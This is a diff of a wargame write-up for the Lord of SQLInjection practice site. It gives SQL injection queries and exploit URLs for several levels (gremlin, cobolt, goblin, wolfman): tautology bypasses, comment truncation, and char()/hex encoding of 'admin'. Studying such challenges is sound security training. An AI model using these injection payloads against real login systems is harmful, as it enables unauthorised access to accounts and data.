@@ -9,7 +9,7 @@ query:
 select id from prob_gremlin where id='0'||1#' and pw=''
 ```
 
-https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=0'||1%23
+__exploit :__ https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=0'||1%23
 
 ![gremlin](./pwned/gremlin.PNG)
 
@@ -23,7 +23,8 @@ query:
 ```SQL
 select id from prob_cobolt where id='admin'#' and pw=md5('')
 ```
-https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin%27%23
+
+__exploit :__ https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin'%23
 
 ![cobolt](./pwned/cobolt.PNG)
 
@@ -33,31 +34,34 @@ https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin
 
 ![goblin](./pic/goblin.PNG)
 
-query1:
+__query1 :__
 ```SQL
 select id from prob_goblin where id='guest' and no=0 or no!=1
 ```
-__exploit :__ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20no!=1
+
+__exploit :__ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or no!=1
 
 
-query2: 
+__query2 :__
 ```SQL
 select id from prob_goblin where id='guest' and no=0 or id=char(97, 100, 109, 105, 110)
 ```
  
-___exploit :___ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20id=char(97,100,109,105,110)
+__exploit :__ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or id=char(97,100,109,105,110)
 
-query3:
+__query3 :__
 ```SQL
 select id from prob_goblin where id='guest' and no=0 or ord(id)=97
 ```
-__exploit :__ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20ord(id)=97
 
-query4:
+__exploit :__ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or ord(id)=97
+
+__query4 :__
 ```SQL
 select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
 ```
-__exploit :__ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0%20or%20id=0x61646d696e
+
+__exploit :__ https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or id=0x61646d696e
 
 ![goblin](./pwned/goblin.PNG)
 
@@ -69,7 +73,7 @@ length: 8
 
 ![orc-length](./pic/orc-length.PNG)
 
-___exploit___ : [orc.py](./code/orc.py)
+__exploit__ : [orc.py](./code/orc.py)
 
 ```Python
 import requests
@@ -97,3 +101,17 @@ print("pw = " + pw)
 
 ![pwned](./pwned/orc.PNG)
 
+## wolfman
+
+![wolfman](./pic/wolfman.PNG)
+
+__query :__
+```SQL
+select id from prob_wolfman where id='guest' and pw=''||id='admin'
+```
+
+__exploit :__ https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw='||id='admin
+
+![wolfman](./pwned/wolfman.PNG)
+
+<br>
